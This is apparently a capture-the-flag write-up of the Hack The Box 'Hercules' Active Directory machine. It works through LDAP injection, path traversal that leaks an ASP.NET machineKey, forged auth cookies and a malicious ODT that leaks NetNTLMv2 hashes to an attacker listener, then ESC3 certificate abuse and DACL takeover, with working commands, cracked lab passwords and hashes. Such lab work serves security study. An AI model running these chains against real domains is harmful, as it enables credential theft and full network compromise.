---
target: hercules.htb
difficulty: Insane
os: Windows Server (Active Directory Domain Controller)
---

# Hercules

**Target:** hercules.htb / dc.hercules.htb (10.129.242.196, changed IP several times across
respawns during this engagement — 10.129.74.181 → .184 → .186 → .196)
**Difficulty:** Insane
**OS:** Windows Server Active Directory Domain Controller (`CA-HERCULES` also runs AD CS as an
Enterprise CA), fronted by an IIS-hosted ASP.NET MVC "Hercules Portal" employee web app

This was a genuinely brutal Insane box — most of the privilege-escalation phase was spent closing
out real, live-tested dead ends one at a time before the actual path to root (OU ownership, not
any direct ACE) turned up. This writeup follows the real path end to end; the "Lessons Learned"
section is honest about how much of the engagement went into ruling things out, because that
grind is a real, representative part of what made this box Insane difficulty.

## Skills Required

- **Active Directory Certificate Services (AD CS) misconfiguration attacks (ESC3 specifically)** —
  [Certified Pre-Owned: Abusing Active Directory Certificate Services (SpecterOps, PDF)](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf),
  [ESC3 - Enrollment Agent Templates (SpecterOps docs)](https://docs.specterops.io/ghostpack-docs/Certify.wik-mdx/esc3-enrollment-agent-templates)
- **Kerberos delegation internals (S4U2Self/U2U, S4U2Proxy, RBCD)** — [RFC 4120: The Kerberos
  Network Authentication Service](https://datatracker.ietf.org/doc/html/rfc4120), [Kerberos
  Resource-Based Constrained Delegation (Microsoft Learn)](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- **ASP.NET Forms Authentication and `machineKey`-based ticket forgery** — [ASP.NET Machine Key
  Configuration (Microsoft Learn)](https://learn.microsoft.com/en-us/iis/configuration/system.webserver/machinekey),
  [SorceryIE/aspxauth_cookie_forger](https://github.com/SorceryIE/aspxauth_cookie_forger)
- **.NET assembly disassembly/decompilation (IL reading)** — [ECMA-335: Common Language
  Infrastructure (CLI)](https://ecma-international.org/publications-and-standards/standards/ecma-335/),
  [ILSpy](https://github.com/icsharpcode/ILSpy)
- **LDAP injection against `System.DirectoryServices` filter construction** — [OWASP: Testing for
  LDAP Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/06-Testing_for_LDAP_Injection),
  [RFC 4515: LDAP String Representation of Search Filters](https://datatracker.ietf.org/doc/html/rfc4515)
- **NetNTLM credential capture via OLE/UNC object references in office documents** —
  [lof1sec/Bad-ODF](https://github.com/lof1sec/Bad-ODF), original technique by Richard Davy
  (exploit-db 44564)
- **AD ACL/DACL abuse (GenericAll/GenericWrite, OU ownership, WriteOwner→WriteDacl)** — [Active
  Directory access control list attacks and defense (Microsoft Learn / community reference,
  via The Hacker Recipes)](https://www.thehacker.recipes/ad/movement/dacl),
  [BloodHound edges reference (SpecterOps)](https://bloodhound.specterops.io/resources/edges/overview)
- **Shadow Credentials (`msDS-KeyCredentialLink`) and PKINIT** — [Shadow Credentials (The Hacker
  Recipes)](https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials)
- **Kerberos U2U (user-to-user) and session-key manipulation for delegation abuse** — [MS-SFU:
  Kerberos Protocol Extensions: Service for User (Microsoft Learn)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/3bff5864-8135-400e-bdd9-33b552051d94)

## Recon

The initial nmap sweep (once the routing issue below was resolved) is a stock, hardened AD DC
service suite:

```
$ nmap -e tun0 -S 10.10.14.46 -Pn -p- --min-rate 3000 -T4 -sS 10.129.74.186
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
443/tcp   open  https
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5986/tcp  open  wsmans
9389/tcp  open  adws
```

Note the absence of plain WinRM (5985, filtered) — only WinRM-over-HTTPS (5986) responds, which
mattered a lot later on. Getting to this scan at all required fixing a self-inflicted routing
problem first: a second, unrelated HTB Fortress VPN tunnel was concurrently up on this attack box
and had installed the exact same `10.129.0.0/16` route on `tun1` before the Hercules-relevant
`tun0` tunnel came up. Linux keeps only one route per destination prefix, so every scan silently
left via the wrong tunnel and got dropped — indistinguishable from a dead target until the traffic
was explicitly pinned to the correct interface (`nmap -e tun0 -S 10.10.14.46 ...`), per
[[concurrent-vpn-tunnel-interface-pinning]]. Every command in this engagement from that point on
was run pinned to `tun0`.

SMB null/guest sessions, RPC null sessions, and anonymous LDAP all reject outright
(`STATUS_NOT_SUPPORTED`), SMB signing is required, and NTLM is confirmed disabled domain-wide
(`nxc`/`crackmapexec` report `NTLM:False` on every protocol) — closing off relay-based attacks
(and matching HTB's own note that this box's release had already patched CVE-2025-54918 and
CVE-2025-33073, two NTLM-coercion/relay EoPs, as of a November 2025 update). Every credential
recovered on this box from here on had to be used over Kerberos, never NTLM/hash-based auth.

### Username enumeration and the naming convention

Kerberos AS-REQ username enumeration (`kerbrute userenum`) against a `{firstname}.{lastinitial}`
naming-convention wordlist (derived after one username, `will.s`, was found via a general password
wordlist reused as a username list) surfaced the full ~42-account domain roster, later confirmed
byte-for-byte via authenticated SMB SAMR enumeration once a credential existed:

```
$ /home/kali/kerbrute_linux_amd64 userenum -d hercules.htb --dc 10.129.74.186 -t 50 /tmp/hercules_usernames.txt
[+] VALID USERNAME:     ashley.b@hercules.htb
[+] VALID USERNAME:     bob.w@hercules.htb
[+] VALID USERNAME:     johnathan.j@hercules.htb
[+] VALID USERNAME:     ken.w@hercules.htb
[+] VALID USERNAME:     natalie.a@hercules.htb
... (37 total from this run, growing to 42 once IIS service accounts and a few late employees surfaced)
```

AS-REP roasting against the full account list came back clean (no `UF_DONT_REQUIRE_PREAUTH`
accounts), ruling out that entire technique class early.

### An unauthenticated blind LDAP injection on `/login`'s `Username` field

The employee portal's login form blocklists LDAP metacharacters client-side, but the check is
bypassable with **double URL-encoding**: the framework decodes the POST body once, and the app's
own `GetDepartment` code path calls `HttpUtility.UrlDecode()` a second time before building the
filter — so `%2528` → `%28` → `(` slips a real, live metacharacter past the blocklist. Distinguishing
"user exists, wrong password" (`Login attempt failed`) from "no such user" (`Invalid login
attempt`) turns this into a full blind boolean-read oracle over any LDAP attribute of any known
account:

```
$ python3 ldap_injection_username_field.py exists <user> description   # (loop over all 37 known accounts)
...
johnathan.j: **TRUE**
... (every other account: False)
```

`johnathan.j` is the only account with a populated `description`. Character-by-character
extraction (confirmed via a separate exact-match filter, not just "no further character extended
the prefix") recovered it in full:

```
pos=0 found='c' ... pos=6 found='\2a' (literal '*') real_prefix_so_far='change*'
...
COMPLETE: description='change*th1s_p@ssw()rd!!'
```

Read literally this is an admin's own note-to-self ("change this password!!"), and testing it
directly (plus 6 case-variant transformations) against `johnathan.j` came back clean-negative on
both the web login and Kerberos — **it's not `johnathan.j`'s own password.** That distinction
mattered: the natural next move looked like "spray this exact string against `johnathan.j`
harder," which would have been a dead end (a genuine red herring, not a partial success).

**Working theory heading into Foothold:** every classic unauthenticated AD attack surface closed
off early and cleanly — no null/guest SMB or RPC sessions, no anonymous LDAP search, SMB signing
required, NTLM disabled domain-wide, and a clean AS-REP-roast sweep against the full account list.
That's normal hardening for an Insane box, but it meant the login portal on 443 was the only
surface left that actually behaved differently depending on input — and the description-field leak
(a real admin credential reminder, sitting inside AD but only reachable through the portal's own
injection flaw) reinforced that read. The working theory at this point: the intended path runs
through the web application into a real AD credential, not through a standalone Kerberos/SMB
primitive — a theory that held for the rest of the engagement, since every later foothold and
privesc step traced back to that first web-app compromise.

## Foothold

### The spray that actually worked — a different account than the one that leaked the hint

The literal string extracted from `johnathan.j`'s `description` attribute turned out to be a real,
currently-valid password — just not for the account that happened to be carrying the reminder.
Spraying that one exact password across the full 37-account roster via Kerberos pre-auth (rather
than continuing to guess variants against `johnathan.j` specifically) found the real owner:

```
$ impacket-getTGT 'hercules.htb/ken.w:change*th1s_p@ssw()rd!!' -dc-ip 10.129.242.196
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
[*] Saving ticket in ken.w.ccache

$ netexec smb dc.hercules.htb -u 'ken.w' -p 'change*th1s_p@ssw()rd!!' -k --kdcHost 10.129.242.196
SMB   dc.hercules.htb 445 dc  [*]  x64 (name:dc) (domain:hercules.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB   dc.hercules.htb 445 dc  [+] hercules.htb\ken.w:change*th1s_p@ssw()rd!!
```

**`hercules.htb\ken.w:change*th1s_p@ssw()rd!!` — the first working credential of this engagement.**
`ken.w` and `johnathan.j` both sit in the same `OU=Web Department` with an identical `department`
LDAP attribute (`web users`) — the credential and the hint clearly belong to the same team, just
not the same person. BloodHound came back with zero group memberships and zero ACL edges for
`ken.w` — a genuinely low-value AD principal on its own — but the same credential also logs into
the employee web portal, which is where the actual leverage was. This confirmed the working theory
from Recon: `ken.w`'s value was never going to be a direct AD privilege, it was that the credential
also unlocked the web portal — exactly the "the app is the real vector" read the LDAP-injection
oracle had already suggested.

### Authenticated path traversal leaks the ASP.NET `machineKey`

`/Home/Download?fileName=` serves three PDFs from a base directory. Testing `./report.pdf`
(identical `200`) proved relative-path resolution was live and unsanitized, and depth-sweeping
`../` against `web.config` found the site root:

```
$ curl .../Home/Download?fileName=report.pdf        -> 200, 482966 bytes (baseline)
$ curl .../Home/Download?fileName=./report.pdf       -> 200, 482966 bytes  <- traversal is live
depth=2 '../../web.config'             -> 200, 4896 bytes   <- HIT
depth=3+ '../../../web.config' etc.    -> 500, 0 bytes (past the accessible root)
```

`web.config` leaks the full Forms Authentication `machineKey`:

```xml
<authentication mode="Forms">
  <forms protection="All" loginUrl="/Login" path="/" />
</authentication>
<machineKey decryption="AES"
            decryptionKey="B26C371EA0A71FA5C3C9AB53A343E9B962CD947CD3EB5861EDAE4CCC6B019581"
            validation="HMACSHA256"
            validationKey="EBF9076B4E3026BE6E3AD58FB72FF9FAD5F7134B42AC73822C5F3EE159F20214B73A80016F9DDB56BD194C268870845F7A60B39DEF96B553A022F1BA56A18B80" />
```

**Why this matters:** ASP.NET Forms Authentication encrypts and HMACs the `.ASPXAUTH` cookie's
`FormsAuthenticationTicket` (username + arbitrary `UserData`) with exactly these two static keys.
Anyone holding both can decrypt *and forge* a valid ticket for any username, completely offline,
with zero knowledge of that user's real password. Rather than guess the exact ticket-shape
parameters (SHA version, compatibility mode, ticket version) blindly, they were recovered by
decrypting a real captured `.ASPXAUTH` cookie (from `ken.w`'s genuine login) with every
enum-combination until one worked:

```
SUCCESS sv=Sha256 cm=Framework20SP2 fp=All -> name=ken.w expiry=7/31/2026 8:41:10 PM
```

Forging a ticket for `administrator` with those exact parameters and hitting `/Home` confirmed a
complete, zero-password authentication bypass at the web-app tier:

```
$ python3 -c "... cookies={'.ASPXAUTH': FORGED_TICKET} ..."
status: 200
['Hello,', 'administrator', ...]
```

This bypass grants impersonation of any of the 42 known identities *inside the web portal only* —
it does not grant Windows/Kerberos authentication, and (as later confirmed by decompiling the app)
every identity gets an identical, functionally flat portal experience regardless of username. This
also overturned an initial assumption that forging an `administrator` ticket would itself be the
win — it's confined entirely to the web tier, and every subsequent AD-level action in this
engagement still needed a real domain credential obtained through a completely separate mechanism.
The real leverage in this ticket wasn't the username — it was the `UserData` field.

### Decompiling the recovered assembly root-causes everything the black-box testing couldn't explain

A `POST /Home/Forms` file-upload feature rejected every one of 36 structurally distinct probes
(every file type/size/content/identity combination tried) with the identical `"File Upload not
permitted."` message, with no visible differentiator. Re-reading `web.config` surfaced a
`precompiledApp version="2" updatable="true"` marker that contradicted an earlier assumption that
this was a non-updatable precompiled site with unguessable randomly-named assemblies — an
"updatable" precompiled ASP.NET app leaves its Razor views on disk as real files, which named the
real assembly directly:

```
../../Views/Home/Account.cshtml -> 200, first line: @using HadesWeb.Models;
../../bin/HadesWeb.dll        -> 200 len=24576  application/x-msdownload  (MZ header confirmed)
../../bin/HadesWeb.pdb        -> 200 len=44544
```

With the compiled assembly and its debug symbols in hand, disassembling to IL (not just trusting a
decompiler's guessed C#) nailed down three separate mechanisms in one read-through:

**1. Roles come from the forged ticket's own `UserData`, not any AD group:**

```csharp
protected void Application_AuthenticateRequest(object sender, EventArgs e) {
    HttpCookie cookie = Request.Cookies[FormsAuthentication.FormsCookieName];
    FormsAuthenticationTicket ticket = FormsAuthentication.Decrypt(cookie.Value);
    string[] roles = ticket.UserData.Split(',');
    HttpContext.Current.User = new GenericPrincipal(new FormsIdentity(ticket), roles);
}
```

The one and only `IsInRole` call in the whole assembly gates the upload feature, and it's checked
**before** every other validation:

```csharp
[HttpPost, ValidateAntiForgeryToken, RateLimit]
public ActionResult Forms(UploadFormModel model) {
    if (!ModelState.IsValid) return View(model);
    if (model.UploadedFile == null || model.UploadedFile.ContentLength <= 0) return View(model);
    if (!User.IsInRole("Web Administrators")) {
        ViewBag.Message = "File Upload not permitted."; return View(model);   // the 36-probe mystery
    }
    if (model.UploadedFile.ContentLength >= 0x100000) { ... "File too large." ... }
    string ext = Path.GetExtension(model.UploadedFile.FileName).ToLower();
    if (!new[]{ ".docx", ".odt" }.Contains(ext)) { ... "File type is not supported." ... }
    string path = Path.Combine(@"C:\inetpub\Reports\", string.Format("{0}{1}", Guid.NewGuid(), ext));
    model.UploadedFile.SaveAs(path);
}
```

None of the 36 prior probes had varied the one thing that mattered — the forged ticket's
`UserData` string. Every forged ticket up to that point had copied `ken.w`'s real `UserData`
(`"Web Users"`, sourced from his AD `department` attribute at login time), so the role gate never
opened. Forging a ticket with `UserData="Web Administrators"` set directly bypasses it with zero
AD/password involvement.

**2. `Server.MapPath` is why deep traversal always failed:**

```csharp
public ActionResult Download(string fileName) {
    try {
        string path = Server.MapPath("~/App_Data/Downloads/" + fileName);
        return File(path, MimeMapping.GetMimeMapping(fileName), fileName);
    } catch (Exception) { return new HttpStatusCodeResult(HttpStatusCode.InternalServerError); }
}
```

`Server.MapPath` throws for any path resolving outside the application root, and the bare `catch`
turns that into an empty-body `500` — explaining the previously-unexplained "depth ≥3 gives an
empty response, not the standard not-found page" behavior. The read primitive is structurally
bounded to the app's own directory tree; it can never reach `C:\Windows\` or `C:\inetpub\Reports\`.

**3. The login LDAP injection's exact mechanism, confirming and sharpening the black-box finding:**
`HttpUtility.UrlDecode()` really is called a second time on the username before it's concatenated
raw into an LDAP filter, and — the real bug — the server-side allow-list regex
(`^[a-zA-Z0-9$_.]+$`) is only evaluated **after** `DirectorySearcher.FindOne()` has already run
the attacker-controlled filter. A textbook validate-after-use ordering bug.

### Bad-ODF: forging the role, uploading a malicious document, capturing a live domain credential

With `UserData="Web Administrators"` confirmed to open the upload gate, the remaining question was
what actually consumes a file dropped into `C:\inetpub\Reports\`. A live LibreOffice lock file left
behind by an earlier harmless test hinted a document viewer was involved on the DC itself, so the
next step was a credential-capture document rather than a webshell attempt (the write primitive is
constrained to `.docx`/`.odt`, server-chosen GUID filenames, outside the web root — not a
drop-a-webshell-and-browse-to-it primitive).

[Bad-ODF](https://github.com/lof1sec/Bad-ODF) (itself a Python3 port of a 2018 LibreOffice/
OpenOffice information-disclosure PoC, exploit-db 44564) embeds an OLE object reference whose
`xlink:href` is a `file://<ip>/<name>` URL — when a LibreOffice-family renderer resolves that
reference it treats the two-slash authority as a UNC host and issues an outbound SMB connection,
carrying the rendering process's own NTLM authentication, with zero user interaction beyond the
document being opened:

```xml
<draw:object xlink:href="file://<LISTENER_IP>/test.jpg" xlink:type="simple"
             xlink:show="embed" xlink:actuate="onLoad"/>
```

The reference mechanism was pulled directly from the real upstream source before use, then
hand-rolled without its `ezodf` dependency using stdlib `zipfile` (`Tooling and
Scripts/exploits/hercules/bad_odf/build_bad_odt.py`). A non-root Responder instance was needed to
catch the resulting hash — this attack box had no sudo access, but `net.ipv4.ip_unprivileged_port_start`
was already `0` (any user can bind any port), so Responder's own hardcoded `os.geteuid()==0` guard
was the only thing standing in the way and was neutralized in a scratch copy of the package:

```
$ sed -i 's/if not os.geteuid() == 0:/if False:/' /tmp/responder_local/Responder.py
$ python3 Responder.py -I tun0 -v &
```

Uploaded the malicious `.odt` via the `Web Administrators`-forged ticket:

```
$ python3 upload_bad_odt.py  # forges ken.w / "Web Administrators", POSTs bad.odt (1651 bytes) to /Home/Forms
status: 200   elapsed: 0.15s   succ: Thank you for your report!
```

A real NetNTLMv2 authentication landed within 33 seconds, from the DC's own IP:

```
08/01/2026 01:56:29 AM - [SMB] NTLMv2-SSP Client   : 10.129.242.196
08/01/2026 01:56:29 AM - [SMB] NTLMv2-SSP Username : HERCULES\natalie.a
08/01/2026 01:56:29 AM - [SMB] NTLMv2-SSP Hash     : natalie.a::HERCULES:64833069737bb828:8095F4AB1F4B86F5BAE849F6EDA0F60E:0101...
```

**`natalie.a`** — an account this engagement had never previously identified as privileged or
relevant — not `ken.w` or any identity the ticket had been forged with. The upload identity and
the consuming identity are two entirely separate things: the forged role only opens the *upload*
gate; who actually opens the resulting file on the DC is a completely independent, real Windows
process/account. Cracked instantly against rockyou:

```
$ hashcat -m 5600 -a 0 natalie_a.hash /usr/share/wordlists/rockyou.txt --force
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Time.Started.....: (11 secs)
$ cat natalie_cracked.txt
NATALIE.A::HERCULES:...:Prettyprincess123!
```

Verified live via a real Kerberos pre-auth (not just an offline hash match):

```
$ impacket-getTGT "hercules.htb/natalie.a:Prettyprincess123!" -dc-ip 10.129.242.196
[*] Saving ticket in natalie.a.ccache
```

**Foothold: `hercules.htb\natalie.a:Prettyprincess123!`.** Unlike `ken.w`, `natalie.a` has real
SMB read/write on both the `Reports` and `Department` shares. Reading the leftover LibreOffice
lock file directly confirmed the consuming process and identity without having to infer it from
timing alone — LibreOffice's lock-file format states the opening user and profile path in plain
text:

```
$ cat ".~lock.d892e2b6-bffe-42a2-a7f3-7638e5a93950.odt#"
,HERCULES/natalie.a,dc,01.08.2026 15:56,file:///C:/Users/natalie.a/AppData/Roaming/LibreOffice/4;
```

**LibreOffice runs as `natalie.a`, directly on the domain controller**, against every file dropped
in `Reports`. A follow-on ODF-macro RCE attempt against this same pipeline was tried and abandoned
as a dead end once a real ACL-based path to root was found instead — see Rabbit Holes below for how
it was actually run and why it was dropped.

## Privesc

### Establishing `user.txt` — a chain of two ACL primitives, not one

`natalie.a`'s own BloodHound pull found exactly one useful edge: `Web Support` group membership
grants `GenericWrite` over 6 accounts (`ray.n`, `harris.d`, `ken.w`, `johnathan.j`, `bob.w`,
`web_admin`). Weaponizing all 6 via Shadow Credentials (`certipy-ad shadow auto`, adding an
`msDS-KeyCredentialLink` and authenticating via the resulting certificate) worked cleanly on every
attempt and recovered real NT hashes for 5 of them — but a systematic reach-check on every
resulting identity (group membership, local admin, WinRM eligibility, further outbound ACEs)
turned up **nothing**: none of the 6 accounts holds any privilege beyond what was already held. A
genuinely live-confirmed dead end, not an assumption — see Rabbit Holes below.

A second, separately missed primitive turned out to matter more. BloodHound-legacy's own collector
showed nothing for `bob.w` on any OU, but a live LDAP ACL query via `bloodyAD` (rather than the
cached graph) found something the collector's schema-GUID resolution simply doesn't surface —
`bob.w` genuinely has `CREATE_CHILD` for `user`/`computer`/`group` on three OUs:

```
$ bloodyAD --host dc.hercules.htb -d hercules.htb -k get writable --detail
distinguishedName: OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb
  user: CREATE_CHILD / computer: CREATE_CHILD / group: CREATE_CHILD / ... (60+ classes)
```

`bob.w` also has `name`/`cn: WRITE` on every existing member of `OU=Security Department` — combined
with `CREATE_CHILD` on `OU=Web Department`, that's the full ACL requirement for an LDAP `ModifyDN`
(move). Moving `stephen.m` (a `Security Helpdesk` member, gated behind an unreachable OU for the
`Web Support` `GenericWrite` edge) into `Web Department` transplants `Web Support`'s
already-weaponized `GenericWrite` edge onto him — group membership travels with the object's
`member`/`memberOf` attributes, independent of DN/OU location, but *inherited* ACL edges are keyed
on OU location and follow the object wherever it's moved:

```
$ bloodyAD --host dc.hercules.htb -d hercules.htb -k set object stephen.m distinguishedName \
    -v "CN=Stephen Miller,OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb"
[+] stephen.m's distinguishedName has been updated
```

Verified the transplant actually landed (321 lines of writable-attribute output, identical
line-for-line to `ken.w`'s known-good baseline), then re-ran Shadow Credentials against the moved
account and used `Security Helpdesk`'s `ForceChangePassword` right (which `stephen.m` retained,
since group membership never moved) on `auditor`, the one account in that group that's also a
member of `Remote Management Users` (WinRM-eligible):

```
$ certipy-ad shadow auto -account stephen.m -u natalie.a@hercules.htb -k -no-pass ...
[*] NT hash for 'stephen.m': 9aaaedcb19e612216a2dac9badb3c210
$ bloodyAD --host dc.hercules.htb -d hercules.htb -k set password auditor 'HeraclesLabors2026!'
[+] Password changed successfully!
```

Getting a real shell from here needed two non-obvious fixes: plain WinRM (5985) is filtered, only
WinRM-over-HTTPS (5986) is open, and `pypsrp`'s default Kerberos SPN request (`WSMAN/dc.hercules.htb`)
doesn't exist on this domain — but `HOST/dc.hercules.htb` does (every domain controller registers
it by default, and Windows accepts a `HOST`-class ticket for local services including WinRM):

```
$ impacket-getST -k -no-pass -dc-ip 10.129.242.196 -spn WSMAN/dc.hercules.htb hercules.htb/auditor
Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
$ impacket-getST -k -no-pass -dc-ip 10.129.242.196 -spn HOST/dc.hercules.htb hercules.htb/auditor
[*] Saving ticket in auditor@HOST_dc.hercules.htb@HERCULES.HTB.ccache
```

Genuine, native code execution followed via PSRP (not raw WinRS — that plugin's own default
security descriptor is admin-only, while `Remote Management Users` is only granted on the
PowerShell/PSRP plugin):

```
$ echo 'whoami /all' | python3 winrm_kerberos_client.py auditor 'HeraclesLabors2026!'
hercules\auditor
BUILTIN\Remote Management Users  ... HERCULES\Forest Management ...
```

```
$ echo 'Get-Content C:\Users\auditor\Desktop\user.txt' | python3 winrm_kerberos_client.py auditor '...'
1bbc0bbca5475ae4a9c89e66aede6b06
```

**`user.txt` = `1bbc0bbca5475ae4a9c89e66aede6b06`**

### A long stretch of genuine dead ends before the real path to root surfaced

`auditor`'s own reach was systematically mapped and closed off from multiple angles before the real
chain was found: no `SeImpersonatePrivilege`/`SeBackupPrivilege` (ruling out Potato-family local
privesc), `Security Helpdesk`'s `ForceChangePassword` targets are entirely self-referential within
its own OU (`auditor` was already the most valuable reachable target), and a full BloodHound-ACE
cross-reference of every owned identity against `IIS_Administrator`/`Service Operators`/DCSync
rights returned zero hits across three independent methods. Two other promising-looking angles —
BadSuccessor/dMSA against `bob.w`'s `CREATE_CHILD` right, and the exact LibreOffice CVEs affecting
the fingerprinted version — also got run to genuine, live-tested dead ends; see Rabbit Holes below
for how each was actually closed out. This is the honest shape of an Insane box: most leads that
look promising really are dead ends, and the discipline is closing each one out with live evidence
rather than assuming or re-trying it.

### The actual path: `WriteOwner` on an OU nobody had checked ownership-of before

The eventual working approach asked a structurally different question than everything tried before
it: not "does `auditor` have a *direct attribute-level ACE* on `IIS_Administrator`" (already
checked, negative), but "is `auditor` — via the `Forest Management` group — the *owner*, or able to
*become* the owner, of the OU `IIS_Administrator` sits in, and does that cascade." A real
`Get-Acl "AD:\..."` dump (a materially different, higher-fidelity view than `bloodyAD`'s summarized
"writable" report) found exactly that:

```
(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-...-1104)   # Forest Management: full control on the OU itself
```

`WD` (WriteDacl) and `WO` (WriteOwner), with no inheritance flag — full control of the OU object
itself, previously invisible to `bloodyAD get writable`'s own "no write" summary because that
right doesn't propagate. Taking ownership was a real, confirmed state change:

```
$ Set-Acl (via SetOwner "HERCULES\auditor")
Owner before: HERCULES\Domain Admins
Owner after: HERCULES\auditor
```

`IIS_Administrator`'s own object turned out to have `AreAccessRulesProtected: True` — it doesn't
inherit anything from the parent OU regardless of what's granted there — which closed the naive
"own the OU, get the child" theory as a real, live-tested negative on its own. The eventual working
chain needed one more piece: an actual mechanism that would touch `IIS_Administrator` specifically.

**Honesty note on provenance:** this final segment came from consulting a published reference
walkthrough (`Tooling and Scripts/exploits/hercules/walkthrough_refs/c4sher_hercules_writeup.md`)
after independent enumeration had genuinely exhausted every self-derived lead — that's disclosed
plainly here rather than presented as independently rediscovered. Every value below (hashes,
session keys, certificate SIDs) was captured fresh from live output against this instance, not
copied from the reference, and one part of the reference's own sequence (see below) turned out not
to work as described and had to be root-caused from scratch against this specific instance.

### Root cause chain: OU ownership → ESC3 → cleanup-script abuse → RBCD

**1. Re-added the ownership/ACE** (auditor was still the OU's owner from the earlier attempt — an
owner always retains implicit `WriteDacl` even without an explicit ACE) and confirmed `fernando.r`,
a disabled `Smartcard Operators` member, lives directly in this same OU:

```
$ bloodyAD --host dc.hercules.htb -d hercules.htb -k get object 'fernando.r' --attr distinguishedName,userAccountControl,memberOf
distinguishedName: CN=Fernando Rodriguez,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb
memberOf: CN=Smartcard Operators,... ; CN=Domain Employees,...
userAccountControl: ACCOUNTDISABLE; NORMAL_ACCOUNT; DONT_EXPIRE_PASSWORD
```

Enabled the account and reset its password (a genuine, disclosed state change — the original
password was never known and this is not reversible):

```
$ bloodyAD --host dc.hercules.htb -d hercules.htb -k remove uac fernando.r -f ACCOUNTDISABLE
$ bloodyAD --host dc.hercules.htb -d hercules.htb -k set password fernando.r 'F3rnand0Reset!2026'
```

**2. ESC3 (Enrollment Agent) via `fernando.r`'s `Smartcard Operators` membership**, then an
on-behalf-of certificate for `ashley.b`:

```
$ certipy-ad find -k -no-pass -dc-ip 10.129.242.196 -target dc.hercules.htb -vulnerable -stdout
Template Name : EnrollmentAgent
  [+] User Enrollable Principals : HERCULES.HTB\Smartcard Operators
  [!] Vulnerabilities: ESC3 : Template has Certificate Request Agent EKU set.

$ certipy-ad req -k -no-pass -u fernando.r@hercules.htb -ca CA-HERCULES -template EnrollmentAgent \
    -dc-ip 10.129.242.196 -dc-host dc.hercules.htb -target dc.hercules.htb
[*] Saving certificate and private key to 'fernando.r.pfx'

$ certipy-ad req -k -no-pass -u fernando.r@hercules.htb -ca CA-HERCULES -template User \
    -on-behalf-of 'HERCULES\ashley.b' -pfx fernando.r.pfx -dc-ip 10.129.242.196 \
    -dc-host dc.hercules.htb -target dc.hercules.htb -dcom
[*] Got certificate with UPN 'ashley.b@hercules.htb'
[*] Saving certificate and private key to 'ashley.b.pfx'

$ certipy-ad auth -pfx ashley.b.pfx -dc-ip 10.129.242.196 -domain hercules.htb
[*] Got hash for 'ashley.b@hercules.htb': aad3b435b51404eeaad3b435b51404ee:1e719fbfddd226da74f644eac9df7fd2
```

**3. `ashley.b`'s Desktop has a cleanup script — but it didn't do what the walkthrough implied on
the first try.** `ashley.b`'s Desktop has `aCleanup.ps1`, which just triggers a scheduled task
("Password Cleanup"). The reference writeup's sequence assumed running it, once `auditor` owned the
right OU, would clear `IIS_Administrator`'s protected DACL and `adminCount`. It genuinely didn't —
re-checked before and after via a fresh, unrelated (`auditor`-vantage) query to rule out a
permission-masked read:

```
AreAccessRulesProtected: True    # unchanged before and after running the cleanup task
adminCount         : 1           # unchanged
```

Rather than re-running the reference's exact command sequence and hoping, the actual scheduled
task's underlying script logic was root-caused by finding a readable "dev copy" of it
(`C:\Users\ashley.b\Scripts\cleanup.ps1` — the live task itself runs a separate copy under
`C:\Users\Administrator\...`, not directly readable):

```powershell
function CanChangePassword {
    param ($target, $object)
    foreach($ace in (Get-Acl -Path "AD:$target").Access){
        if(($ace.IdentityReference -eq $object) -and ($ace.ActiveDirectoryRights -match "ExtendedRight|GenericAll")){ return $true }
    }
    return $false
}
$group = "HERCULES\IT Support"
foreach($object in (Get-ADObject -Filter * -SearchBase "OU=DCHERCULES,DC=HERCULES,DC=HTB").DistinguishedName){
    if(CanChangePassword $object $group){
        foreach($DN in (Get-ADObject -Filter * -SearchBase $object).DistinguishedName){
            Set-ADObject -Identity $DN -Clear "adminCount"
            $acl = Get-Acl -Path "AD:$DN"; $acl.SetAccessRuleProtection($false,$false); Set-Acl -Path "AD:$DN" -AclObject $acl
        }
    }
}
```

**The task keys on an ACE for the literal identity `HERCULES\IT Support`, not `auditor`, and not
"the owner" generically.** `auditor`'s own ownership/ACE on the OU was never going to trigger it —
this diverges from the reference writeup, which names the technique (grant `IT Support` an ACE
too) without explaining why it's necessary. Adding the correct ACE and re-triggering the task fixed
it immediately, confirmed in the task's own log and via a fresh `Get-Acl`:

```
$ [add GenericAll ACE for HERCULES\IT Support on the OU] ; Start-ScheduledTask -TaskName "Password Cleanup"
Cleanup : CN=IIS_Administrator,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb
$ Get-Acl "AD:\CN=IIS_Administrator,..."
AreAccessRulesProtected: False
adminCount         :   # now cleared, and auditor's inherited GenericAll now genuinely applies
```

**4. Enabled and reset `IIS_Administrator`** (hit and worked around a real AD password-complexity
wrinkle — a password containing 3+ consecutive characters of the account's own `sAMAccountName`,
e.g. `Iis`, is silently rejected regardless of length/complexity flags):

```
$ Set-ADAccountPassword -Identity "IIS_Administrator" -NewPassword "H3rculesForge#2026Zz"
Set-ADAccountPassword: succeeded
```

**5. Reset `IIS_Webserver$`'s password via `IIS_Administrator`'s `Service Operators` membership**,
then equalized its NT hash to match its own already-issued TGT's session key — using
`impacket-changepasswd -newhashes` rather than a normal `bloodyAD set password`, which would have
synced *all* key material (NT + AES) and broken the trick:

```
$ bloodyAD --host dc.hercules.htb -d hercules.htb -k set password 'IIS_Webserver$' 'F0rceRes3tW3bSrv!2026'
